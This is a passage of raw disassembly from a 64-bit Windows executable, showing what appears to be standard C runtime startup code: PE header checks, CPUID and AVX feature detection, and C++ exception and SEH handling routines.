   140001736:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   14000173a:	e8 f1 b7 00 00       	call   0x14000cf30
   14000173f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001744:	ff 15 1e c9 00 00    	call   *0xc91e(%rip)        # 0x14000e068
   14000174a:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   14000174f:	b8 0a 00 00 00       	mov    $0xa,%eax
   140001754:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   14000175a:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140001761:	c3                   	ret
   140001762:	cc                   	int3
   140001763:	cc                   	int3
   140001764:	e9 fb fd ff ff       	jmp    0x140001564
   140001769:	cc                   	int3
   14000176a:	cc                   	int3
   14000176b:	cc                   	int3
   14000176c:	48 83 ec 28          	sub    $0x28,%rsp
   140001770:	33 c9                	xor    %ecx,%ecx
   140001772:	ff 15 00 c9 00 00    	call   *0xc900(%rip)        # 0x14000e078
   140001778:	48 85 c0             	test   %rax,%rax
   14000177b:	74 39                	je     0x1400017b6
   14000177d:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140001782:	66 39 08             	cmp    %cx,(%rax)
   140001785:	75 2f                	jne    0x1400017b6
   140001787:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000178b:	48 03 c8             	add    %rax,%rcx
   14000178e:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140001794:	75 20                	jne    0x1400017b6
   140001796:	b8 0b 02 00 00       	mov    $0x20b,%eax
   14000179b:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   14000179f:	75 15                	jne    0x1400017b6
   1400017a1:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   1400017a8:	76 0c                	jbe    0x1400017b6
   1400017aa:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   1400017b1:	0f 95 c0             	setne  %al
   1400017b4:	eb 02                	jmp    0x1400017b8
   1400017b6:	32 c0                	xor    %al,%al
   1400017b8:	48 83 c4 28          	add    $0x28,%rsp
   1400017bc:	c3                   	ret
   1400017bd:	cc                   	int3
   1400017be:	cc                   	int3
   1400017bf:	cc                   	int3
   1400017c0:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x1400017d0
   1400017c7:	48 ff 25 92 c8 00 00 	rex.W jmp *0xc892(%rip)        # 0x14000e060
   1400017ce:	cc                   	int3
   1400017cf:	cc                   	int3
   1400017d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400017d5:	57                   	push   %rdi
   1400017d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400017da:	48 8b 19             	mov    (%rcx),%rbx
   1400017dd:	48 8b f9             	mov    %rcx,%rdi
   1400017e0:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   1400017e6:	75 1c                	jne    0x140001804
   1400017e8:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   1400017ec:	75 16                	jne    0x140001804
   1400017ee:	8b 53 20             	mov    0x20(%rbx),%edx
   1400017f1:	8d 82 e0 fa 6c e6    	lea    -0x19930520(%rdx),%eax
   1400017f7:	83 f8 02             	cmp    $0x2,%eax
   1400017fa:	76 15                	jbe    0x140001811
   1400017fc:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140001802:	74 0d                	je     0x140001811
   140001804:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001809:	33 c0                	xor    %eax,%eax
   14000180b:	48 83 c4 20          	add    $0x20,%rsp
   14000180f:	5f                   	pop    %rdi
   140001810:	c3                   	ret
   140001811:	e8 1e 07 00 00       	call   0x140001f34
   140001816:	48 89 18             	mov    %rbx,(%rax)
   140001819:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   14000181d:	e8 26 07 00 00       	call   0x140001f48
   140001822:	48 89 18             	mov    %rbx,(%rax)
   140001825:	e8 f6 3d 00 00       	call   0x140005620
   14000182a:	cc                   	int3
   14000182b:	cc                   	int3
   14000182c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001831:	57                   	push   %rdi
   140001832:	48 83 ec 20          	sub    $0x20,%rsp
   140001836:	48 8d 1d 4b 49 01 00 	lea    0x1494b(%rip),%rbx        # 0x140016188
   14000183d:	48 8d 3d 44 49 01 00 	lea    0x14944(%rip),%rdi        # 0x140016188
   140001844:	eb 12                	jmp    0x140001858
   140001846:	48 8b 03             	mov    (%rbx),%rax
   140001849:	48 85 c0             	test   %rax,%rax
   14000184c:	74 06                	je     0x140001854
   14000184e:	ff 15 0c ca 00 00    	call   *0xca0c(%rip)        # 0x14000e260
   140001854:	48 83 c3 08          	add    $0x8,%rbx
   140001858:	48 3b df             	cmp    %rdi,%rbx
   14000185b:	72 e9                	jb     0x140001846
   14000185d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001862:	48 83 c4 20          	add    $0x20,%rsp
   140001866:	5f                   	pop    %rdi
   140001867:	c3                   	ret
   140001868:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000186d:	57                   	push   %rdi
   14000186e:	48 83 ec 20          	sub    $0x20,%rsp
   140001872:	48 8d 1d 1f 49 01 00 	lea    0x1491f(%rip),%rbx        # 0x140016198
   140001879:	48 8d 3d 18 49 01 00 	lea    0x14918(%rip),%rdi        # 0x140016198
   140001880:	eb 12                	jmp    0x140001894
   140001882:	48 8b 03             	mov    (%rbx),%rax
   140001885:	48 85 c0             	test   %rax,%rax
   140001888:	74 06                	je     0x140001890
   14000188a:	ff 15 d0 c9 00 00    	call   *0xc9d0(%rip)        # 0x14000e260
   140001890:	48 83 c3 08          	add    $0x8,%rbx
   140001894:	48 3b df             	cmp    %rdi,%rbx
   140001897:	72 e9                	jb     0x140001882
   140001899:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000189e:	48 83 c4 20          	add    $0x20,%rsp
   1400018a2:	5f                   	pop    %rdi
   1400018a3:	c3                   	ret
   1400018a4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400018a9:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400018ae:	55                   	push   %rbp
   1400018af:	57                   	push   %rdi
   1400018b0:	41 56                	push   %r14
   1400018b2:	48 8b ec             	mov    %rsp,%rbp
   1400018b5:	48 83 ec 10          	sub    $0x10,%rsp
   1400018b9:	33 c0                	xor    %eax,%eax
   1400018bb:	33 c9                	xor    %ecx,%ecx
   1400018bd:	0f a2                	cpuid
   1400018bf:	44 8b c1             	mov    %ecx,%r8d
   1400018c2:	44 8b d2             	mov    %edx,%r10d
   1400018c5:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   1400018cc:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   1400018d3:	44 8b cb             	mov    %ebx,%r9d
   1400018d6:	44 8b f0             	mov    %eax,%r14d
   1400018d9:	33 c9                	xor    %ecx,%ecx
   1400018db:	b8 01 00 00 00       	mov    $0x1,%eax
   1400018e0:	0f a2                	cpuid
   1400018e2:	45 0b d0             	or     %r8d,%r10d
   1400018e5:	89 45 f0             	mov    %eax,-0x10(%rbp)
   1400018e8:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   1400018ef:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   1400018f2:	45 0b d1             	or     %r9d,%r10d
   1400018f5:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   1400018f8:	8b f9                	mov    %ecx,%edi
   1400018fa:	89 55 fc             	mov    %edx,-0x4(%rbp)
   1400018fd:	75 5b                	jne    0x14000195a
   1400018ff:	48 83 0d 29 67 01 00 	orq    $0xffffffffffffffff,0x16729(%rip)        # 0x140018030
   140001906:	ff 
   140001907:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   14000190c:	48 c7 05 11 67 01 00 	movq   $0x8000,0x16711(%rip)        # 0x140018028
   140001913:	00 80 00 00 
   140001917:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   14000191c:	74 28                	je     0x140001946
   14000191e:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140001923:	74 21                	je     0x140001946
   140001925:	3d 70 06 02 00       	cmp    $0x20670,%eax
   14000192a:	74 1a                	je     0x140001946
   14000192c:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140001931:	83 f8 20             	cmp    $0x20,%eax
   140001934:	77 24                	ja     0x14000195a
   140001936:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   14000193d:	00 00 00 
   140001940:	48 0f a3 c1          	bt     %rax,%rcx
   140001944:	73 14                	jae    0x14000195a
   140001946:	44 8b 05 fb 71 01 00 	mov    0x171fb(%rip),%r8d        # 0x140018b48
   14000194d:	41 83 c8 01          	or     $0x1,%r8d
   140001951:	44 89 05 f0 71 01 00 	mov    %r8d,0x171f0(%rip)        # 0x140018b48
   140001958:	eb 07                	jmp    0x140001961
   14000195a:	44 8b 05 e7 71 01 00 	mov    0x171e7(%rip),%r8d        # 0x140018b48
   140001961:	45 33 c9             	xor    %r9d,%r9d
   140001964:	41 8b f1             	mov    %r9d,%esi
   140001967:	45 8b d1             	mov    %r9d,%r10d
   14000196a:	45 8b d9             	mov    %r9d,%r11d
   14000196d:	41 83 fe 07          	cmp    $0x7,%r14d
   140001971:	7c 65                	jl     0x1400019d8
   140001973:	41 8d 41 07          	lea    0x7(%r9),%eax
   140001977:	33 c9                	xor    %ecx,%ecx
   140001979:	0f a2                	cpuid
   14000197b:	89 45 f0             	mov    %eax,-0x10(%rbp)
   14000197e:	8b f2                	mov    %edx,%esi
   140001980:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   140001983:	44 8b cb             	mov    %ebx,%r9d
   140001986:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   140001989:	89 55 fc             	mov    %edx,-0x4(%rbp)
   14000198c:	0f ba e3 09          	bt     $0x9,%ebx
   140001990:	73 0b                	jae    0x14000199d
   140001992:	41 83 c8 02          	or     $0x2,%r8d
   140001996:	44 89 05 ab 71 01 00 	mov    %r8d,0x171ab(%rip)        # 0x140018b48
   14000199d:	83 f8 01             	cmp    $0x1,%eax
   1400019a0:	7c 19                	jl     0x1400019bb
   1400019a2:	b8 07 00 00 00       	mov    $0x7,%eax
   1400019a7:	8d 48 fa             	lea    -0x6(%rax),%ecx
   1400019aa:	0f a2                	cpuid
   1400019ac:	44 8b d2             	mov    %edx,%r10d
   1400019af:	89 45 f0             	mov    %eax,-0x10(%rbp)
   1400019b2:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   1400019b5:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   1400019b8:	89 55 fc             	mov    %edx,-0x4(%rbp)
   1400019bb:	b8 24 00 00 00       	mov    $0x24,%eax
   1400019c0:	44 3b f0             	cmp    %eax,%r14d
   1400019c3:	7c 13                	jl     0x1400019d8
   1400019c5:	33 c9                	xor    %ecx,%ecx
   1400019c7:	0f a2                	cpuid
   1400019c9:	44 8b db             	mov    %ebx,%r11d
   1400019cc:	89 45 f0             	mov    %eax,-0x10(%rbp)
   1400019cf:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   1400019d2:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   1400019d5:	89 55 fc             	mov    %edx,-0x4(%rbp)
   1400019d8:	48 8b 05 39 66 01 00 	mov    0x16639(%rip),%rax        # 0x140018018
   1400019df:	bb 06 00 00 00       	mov    $0x6,%ebx
   1400019e4:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   1400019e8:	c7 05 2e 66 01 00 01 	movl   $0x1,0x1662e(%rip)        # 0x140018020
   1400019ef:	00 00 00 
   1400019f2:	c7 05 28 66 01 00 02 	movl   $0x2,0x16628(%rip)        # 0x140018024
   1400019f9:	00 00 00 
   1400019fc:	48 89 05 15 66 01 00 	mov    %rax,0x16615(%rip)        # 0x140018018
   140001a03:	0f ba e7 14          	bt     $0x14,%edi
   140001a07:	73 1b                	jae    0x140001a24
   140001a09:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   140001a0d:	c7 05 09 66 01 00 02 	movl   $0x2,0x16609(%rip)        # 0x140018020
   140001a14:	00 00 00 
   140001a17:	48 89 05 fa 65 01 00 	mov    %rax,0x165fa(%rip)        # 0x140018018
   140001a1e:	89 1d 00 66 01 00    	mov    %ebx,0x16600(%rip)        # 0x140018024
   140001a24:	0f ba e7 1b          	bt     $0x1b,%edi
   140001a28:	0f 83 2b 01 00 00    	jae    0x140001b59
   140001a2e:	33 c9                	xor    %ecx,%ecx
   140001a30:	0f 01 d0             	xgetbv
   140001a33:	48 c1 e2 20          	shl    $0x20,%rdx
   140001a37:	48 0b d0             	or     %rax,%rdx
   140001a3a:	48 89 55 20          	mov    %rdx,0x20(%rbp)
   140001a3e:	0f ba e7 1c          	bt     $0x1c,%edi
   140001a42:	0f 83 f6 00 00 00    	jae    0x140001b3e
   140001a48:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140001a4c:	22 c3                	and    %bl,%al
   140001a4e:	3a c3                	cmp    %bl,%al
   140001a50:	0f 85 e8 00 00 00    	jne    0x140001b3e
   140001a56:	8b 05 c8 65 01 00    	mov    0x165c8(%rip),%eax        # 0x140018024
   140001a5c:	b2 e0                	mov    $0xe0,%dl
   140001a5e:	83 c8 08             	or     $0x8,%eax
   140001a61:	c7 05 b5 65 01 00 03 	movl   $0x3,0x165b5(%rip)        # 0x140018020
   140001a68:	00 00 00 
   140001a6b:	89 05 b3 65 01 00    	mov    %eax,0x165b3(%rip)        # 0x140018024
   140001a71:	41 f6 c1 20          	test   $0x20,%r9b
   140001a75:	74 5d                	je     0x140001ad4
   140001a77:	83 c8 20             	or     $0x20,%eax
   140001a7a:	c7 05 9c 65 01 00 05 	movl   $0x5,0x1659c(%rip)        # 0x140018020
   140001a81:	00 00 00 
   140001a84:	89 05 9a 65 01 00    	mov    %eax,0x1659a(%rip)        # 0x140018024
   140001a8a:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   140001a8f:	48 8b 05 82 65 01 00 	mov    0x16582(%rip),%rax        # 0x140018018
   140001a96:	44 23 c9             	and    %ecx,%r9d
   140001a99:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   140001a9d:	48 89 05 74 65 01 00 	mov    %rax,0x16574(%rip)        # 0x140018018
   140001aa4:	44 3b c9             	cmp    %ecx,%r9d
   140001aa7:	75 32                	jne    0x140001adb
   140001aa9:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140001aad:	22 c2                	and    %dl,%al
   140001aaf:	3a c2                	cmp    %dl,%al
   140001ab1:	75 21                	jne    0x140001ad4
   140001ab3:	48 8b 05 5e 65 01 00 	mov    0x1655e(%rip),%rax        # 0x140018018
   140001aba:	83 0d 63 65 01 00 40 	orl    $0x40,0x16563(%rip)        # 0x140018024
   140001ac1:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   140001ac5:	89 1d 55 65 01 00    	mov    %ebx,0x16555(%rip)        # 0x140018020
   140001acb:	48 89 05 46 65 01 00 	mov    %rax,0x16546(%rip)        # 0x140018018
   140001ad2:	eb 07                	jmp    0x140001adb
   140001ad4:	48 8b 05 3d 65 01 00 	mov    0x1653d(%rip),%rax        # 0x140018018
   140001adb:	0f ba e6 17          	bt     $0x17,%esi
   140001adf:	73 0c                	jae    0x140001aed
   140001ae1:	48 0f ba f0 18       	btr    $0x18,%rax
   140001ae6:	48 89 05 2b 65 01 00 	mov    %rax,0x1652b(%rip)        # 0x140018018
   140001aed:	41 0f ba e2 13       	bt     $0x13,%r10d
   140001af2:	73 4a                	jae    0x140001b3e
   140001af4:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140001af8:	22 c2                	and    %dl,%al
   140001afa:	3a c2                	cmp    %dl,%al
   140001afc:	75 40                	jne    0x140001b3e
   140001afe:	41 8b cb             	mov    %r11d,%ecx
   140001b01:	41 8b c3             	mov    %r11d,%eax
   140001b04:	48 c1 e9 10          	shr    $0x10,%rcx
   140001b08:	25 ff 00 04 00       	and    $0x400ff,%eax
   140001b0d:	83 e1 07             	and    $0x7,%ecx
   140001b10:	89 05 2e 70 01 00    	mov    %eax,0x1702e(%rip)        # 0x140018b44
   140001b16:	48 81 c9 28 00 00 01 	or     $0x1000028,%rcx
   140001b1d:	48 f7 d1             	not    %rcx
   140001b20:	48 23 0d f1 64 01 00 	and    0x164f1(%rip),%rcx        # 0x140018018
   140001b27:	48 89 0d ea 64 01 00 	mov    %rcx,0x164ea(%rip)        # 0x140018018
   140001b2e:	83 f8 01             	cmp    $0x1,%eax
   140001b31:	76 0b                	jbe    0x140001b3e
   140001b33:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   140001b37:	48 89 0d da 64 01 00 	mov    %rcx,0x164da(%rip)        # 0x140018018
   140001b3e:	41 0f ba e2 15       	bt     $0x15,%r10d
   140001b43:	73 14                	jae    0x140001b59
   140001b45:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140001b49:	48 0f ba e0 13       	bt     $0x13,%rax
   140001b4e:	73 09                	jae    0x140001b59
   140001b50:	48 0f ba 35 bf 64 01 	btrq   $0x7,0x164bf(%rip)        # 0x140018018
   140001b57:	00 07 
   140001b59:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001b5e:	33 c0                	xor    %eax,%eax
   140001b60:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140001b65:	48 83 c4 10          	add    $0x10,%rsp
   140001b69:	41 5e                	pop    %r14
   140001b6b:	5f                   	pop    %rdi
   140001b6c:	5d                   	pop    %rbp
   140001b6d:	c3                   	ret
   140001b6e:	cc                   	int3
   140001b6f:	cc                   	int3
   140001b70:	33 c0                	xor    %eax,%eax
   140001b72:	39 05 f8 81 01 00    	cmp    %eax,0x181f8(%rip)        # 0x140019d70
   140001b78:	0f 95 c0             	setne  %al
   140001b7b:	c3                   	ret
   140001b7c:	cc                   	int3
   140001b7d:	cc                   	int3
   140001b7e:	cc                   	int3
   140001b7f:	cc                   	int3
   140001b80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001b85:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140001b8a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001b8f:	57                   	push   %rdi
   140001b90:	41 54                	push   %r12
   140001b92:	41 55                	push   %r13
   140001b94:	41 56                	push   %r14
   140001b96:	41 57                	push   %r15
   140001b98:	48 83 ec 40          	sub    $0x40,%rsp
   140001b9c:	48 8b f1             	mov    %rcx,%rsi
   140001b9f:	4d 8b f9             	mov    %r9,%r15
   140001ba2:	49 8b c8             	mov    %r8,%rcx
   140001ba5:	49 8b e8             	mov    %r8,%rbp
   140001ba8:	4c 8b ea             	mov    %rdx,%r13
   140001bab:	e8 24 04 00 00       	call   0x140001fd4
   140001bb0:	4d 8b 67 08          	mov    0x8(%r15),%r12
   140001bb4:	4d 8b 37             	mov    (%r15),%r14
   140001bb7:	49 8b 5f 38          	mov    0x38(%r15),%rbx
   140001bbb:	4d 2b f4             	sub    %r12,%r14
   140001bbe:	f6 46 04 66          	testb  $0x66,0x4(%rsi)
   140001bc2:	41 8b 7f 48          	mov    0x48(%r15),%edi
   140001bc6:	0f 85 f1 00 00 00    	jne    0x140001cbd
   140001bcc:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140001bd1:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   140001bd6:	e9 ce 00 00 00       	jmp    0x140001ca9
   140001bdb:	8b cf                	mov    %edi,%ecx
   140001bdd:	48 03 c9             	add    %rcx,%rcx
   140001be0:	8b ef                	mov    %edi,%ebp
   140001be2:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140001be6:	4c 3b f0             	cmp    %rax,%r14
   140001be9:	0f 82 b8 00 00 00    	jb     0x140001ca7
   140001bef:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   140001bf3:	4c 3b f0             	cmp    %rax,%r14
   140001bf6:	0f 83 ab 00 00 00    	jae    0x140001ca7
   140001bfc:	83 7c cb 10 00       	cmpl   $0x0,0x10(%rbx,%rcx,8)
   140001c01:	0f 84 a0 00 00 00    	je     0x140001ca7
   140001c07:	83 7c cb 0c 01       	cmpl   $0x1,0xc(%rbx,%rcx,8)
   140001c0c:	74 1b                	je     0x140001c29
   140001c0e:	8b 44 cb 0c          	mov    0xc(%rbx,%rcx,8),%eax
   140001c12:	49 8b d5             	mov    %r13,%rdx
   140001c15:	49 03 c4             	add    %r12,%rax
   140001c18:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001c1d:	ff d0                	call   *%rax
   140001c1f:	85 c0                	test   %eax,%eax
   140001c21:	0f 88 8f 00 00 00    	js     0x140001cb6
   140001c27:	7e 7e                	jle    0x140001ca7
   140001c29:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%rsi)
   140001c2f:	75 28                	jne    0x140001c59
   140001c31:	48 83 3d 17 c7 00 00 	cmpq   $0x0,0xc717(%rip)        # 0x14000e350
   140001c38:	00 
   140001c39:	74 1e                	je     0x140001c59
   140001c3b:	48 8d 0d 0e c7 00 00 	lea    0xc70e(%rip),%rcx        # 0x14000e350
   140001c42:	e8 49 ae 00 00       	call   0x14000ca90
   140001c47:	85 c0                	test   %eax,%eax
   140001c49:	74 0e                	je     0x140001c59
   140001c4b:	ba 01 00 00 00       	mov    $0x1,%edx
   140001c50:	48 8b ce             	mov    %rsi,%rcx
   140001c53:	ff 15 f7 c6 00 00    	call   *0xc6f7(%rip)        # 0x14000e350
   140001c59:	48 8d 45 01          	lea    0x1(%rbp),%rax
   140001c5d:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001c63:	48 03 c0             	add    %rax,%rax
   140001c66:	49 8b d5             	mov    %r13,%rdx
   140001c69:	8b 0c c3             	mov    (%rbx,%rax,8),%ecx
   140001c6c:	49 03 cc             	add    %r12,%rcx
   140001c6f:	e8 2c 03 00 00       	call   0x140001fa0
   140001c74:	44 8b 0e             	mov    (%rsi),%r9d
   140001c77:	48 8d 45 01          	lea    0x1(%rbp),%rax
   140001c7b:	48 03 c0             	add    %rax,%rax
   140001c7e:	4c 8b c6             	mov    %rsi,%r8
   140001c81:	49 8b cd             	mov    %r13,%rcx
   140001c84:	8b 14 c3             	mov    (%rbx,%rax,8),%edx
   140001c87:	49 8b 47 40          	mov    0x40(%r15),%rax
   140001c8b:	49 03 d4             	add    %r12,%rdx
   140001c8e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001c93:	49 8b 47 28          	mov    0x28(%r15),%rax
   140001c97:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001c9c:	ff 15 e6 c3 00 00    	call   *0xc3e6(%rip)        # 0x14000e088
   140001ca2:	e8 29 03 00 00       	call   0x140001fd0
   140001ca7:	ff c7                	inc    %edi
   140001ca9:	3b 3b                	cmp    (%rbx),%edi
   140001cab:	0f 82 2a ff ff ff    	jb     0x140001bdb
   140001cb1:	e9 be 00 00 00       	jmp    0x140001d74
   140001cb6:	33 c0                	xor    %eax,%eax
   140001cb8:	e9 bc 00 00 00       	jmp    0x140001d79
   140001cbd:	49 8b 6f 20          	mov    0x20(%r15),%rbp
   140001cc1:	49 2b ec             	sub    %r12,%rbp
   140001cc4:	e9 9f 00 00 00       	jmp    0x140001d68
   140001cc9:	44 8b cf             	mov    %edi,%r9d
   140001ccc:	4d 03 c9             	add    %r9,%r9
   140001ccf:	42 8b 44 cb 04       	mov    0x4(%rbx,%r9,8),%eax
   140001cd4:	4c 3b f0             	cmp    %rax,%r14
   140001cd7:	0f 82 89 00 00 00    	jb     0x140001d66
   140001cdd:	42 8b 44 cb 08       	mov    0x8(%rbx,%r9,8),%eax
   140001ce2:	4c 3b f0             	cmp    %rax,%r14
   140001ce5:	73 7f                	jae    0x140001d66
   140001ce7:	f6 46 04 20          	testb  $0x20,0x4(%rsi)
   140001ceb:	74 3f                	je     0x140001d2c
   140001ced:	33 d2                	xor    %edx,%edx
   140001cef:	45 85 c0             	test   %r8d,%r8d
   140001cf2:	74 34                	je     0x140001d28
   140001cf4:	8b ca                	mov    %edx,%ecx
   140001cf6:	48 03 c9             	add    %rcx,%rcx
   140001cf9:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140001cfd:	48 3b e8             	cmp    %rax,%rbp
   140001d00:	72 1f                	jb     0x140001d21
   140001d02:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   140001d06:	48 3b e8             	cmp    %rax,%rbp
   140001d09:	73 16                	jae    0x140001d21
   140001d0b:	42 8b 44 cb 10       	mov    0x10(%rbx,%r9,8),%eax
   140001d10:	39 44 cb 10          	cmp    %eax,0x10(%rbx,%rcx,8)
   140001d14:	75 0b                	jne    0x140001d21
   140001d16:	42 8b 44 cb 0c       	mov    0xc(%rbx,%r9,8),%eax
   140001d1b:	39 44 cb 0c          	cmp    %eax,0xc(%rbx,%rcx,8)
   140001d1f:	74 07                	je     0x140001d28
   140001d21:	ff c2                	inc    %edx
   140001d23:	41 3b d0             	cmp    %r8d,%edx
   140001d26:	72 cc                	jb     0x140001cf4
   140001d28:	3b 13                	cmp    (%rbx),%edx
   140001d2a:	75 48                	jne    0x140001d74
   140001d2c:	8b c7                	mov    %edi,%eax
   140001d2e:	48 ff c0             	inc    %rax
   140001d31:	8b cf                	mov    %edi,%ecx
   140001d33:	48 03 c0             	add    %rax,%rax
   140001d36:	48 03 c9             	add    %rcx,%rcx
   140001d39:	83 3c c3 00          	cmpl   $0x0,(%rbx,%rax,8)
   140001d3d:	74 10                	je     0x140001d4f
   140001d3f:	8b 04 c3             	mov    (%rbx,%rax,8),%eax
   140001d42:	48 3b e8             	cmp    %rax,%rbp
   140001d45:	75 1f                	jne    0x140001d66
   140001d47:	f6 46 04 20          	testb  $0x20,0x4(%rsi)
   140001d4b:	75 27                	jne    0x140001d74
   140001d4d:	eb 17                	jmp    0x140001d66
   140001d4f:	8d 47 01             	lea    0x1(%rdi),%eax
   140001d52:	49 8b d5             	mov    %r13,%rdx
   140001d55:	41 89 47 48          	mov    %eax,0x48(%r15)
   140001d59:	44 8b 44 cb 0c       	mov    0xc(%rbx,%rcx,8),%r8d
   140001d5e:	b1 01                	mov    $0x1,%cl
   140001d60:	4d 03 c4             	add    %r12,%r8
   140001d63:	41 ff d0             	call   *%r8
   140001d66:	ff c7                	inc    %edi
   140001d68:	44 8b 03             	mov    (%rbx),%r8d
   140001d6b:	41 3b f8             	cmp    %r8d,%edi
   140001d6e:	0f 82 55 ff ff ff    	jb     0x140001cc9
   140001d74:	b8 01 00 00 00       	mov    $0x1,%eax
   140001d79:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140001d7e:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140001d82:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140001d86:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140001d8a:	49 8b e3             	mov    %r11,%rsp
   140001d8d:	41 5f                	pop    %r15
   140001d8f:	41 5e                	pop    %r14
   140001d91:	41 5d                	pop    %r13
   140001d93:	41 5c                	pop    %r12
   140001d95:	5f                   	pop    %rdi
   140001d96:	c3                   	ret
   140001d97:	cc                   	int3
   140001d98:	48 83 ec 28          	sub    $0x28,%rsp
   140001d9c:	e8 d3 03 00 00       	call   0x140002174
   140001da1:	84 c0                	test   %al,%al
   140001da3:	75 04                	jne    0x140001da9
   140001da5:	32 c0                	xor    %al,%al
   140001da7:	eb 12                	jmp    0x140001dbb
   140001da9:	e8 5a 03 00 00       	call   0x140002108
   140001dae:	84 c0                	test   %al,%al
   140001db0:	75 07                	jne    0x140001db9
   140001db2:	e8 05 04 00 00       	call   0x1400021bc
   140001db7:	eb ec                	jmp    0x140001da5
   140001db9:	b0 01                	mov    $0x1,%al
   140001dbb:	48 83 c4 28          	add    $0x28,%rsp
   140001dbf:	c3                   	ret
   140001dc0:	48 83 ec 28          	sub    $0x28,%rsp
   140001dc4:	84 c9                	test   %cl,%cl
   140001dc6:	75 0a                	jne    0x140001dd2
   140001dc8:	e8 83 03 00 00       	call   0x140002150
   140001dcd:	e8 ea 03 00 00       	call   0x1400021bc
   140001dd2:	b0 01                	mov    $0x1,%al
   140001dd4:	48 83 c4 28          	add    $0x28,%rsp
   140001dd8:	c3                   	ret
   140001dd9:	cc                   	int3
   140001dda:	cc                   	int3
   140001ddb:	cc                   	int3
   140001ddc:	48 3b ca             	cmp    %rdx,%rcx
   140001ddf:	74 19                	je     0x140001dfa
   140001de1:	48 83 c2 09          	add    $0x9,%rdx
   140001de5:	48 8d 41 09          	lea    0x9(%rcx),%rax
   140001de9:	48 2b d0             	sub    %rax,%rdx
   140001dec:	8a 08                	mov    (%rax),%cl
   140001dee:	3a 0c 10             	cmp    (%rax,%rdx,1),%cl
   140001df1:	75 0a                	jne    0x140001dfd
   140001df3:	48 ff c0             	inc    %rax
   140001df6:	84 c9                	test   %cl,%cl
   140001df8:	75 f2                	jne    0x140001dec
   140001dfa:	33 c0                	xor    %eax,%eax
   140001dfc:	c3                   	ret
   140001dfd:	1b c0                	sbb    %eax,%eax
   140001dff:	83 c8 01             	or     $0x1,%eax
   140001e02:	c3                   	ret
   140001e03:	cc                   	int3
   140001e04:	48 85 c9             	test   %rcx,%rcx
   140001e07:	74 67                	je     0x140001e70
   140001e09:	88 54 24 10          	mov    %dl,0x10(%rsp)
   140001e0d:	48 83 ec 48          	sub    $0x48,%rsp
   140001e11:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   140001e17:	75 53                	jne    0x140001e6c
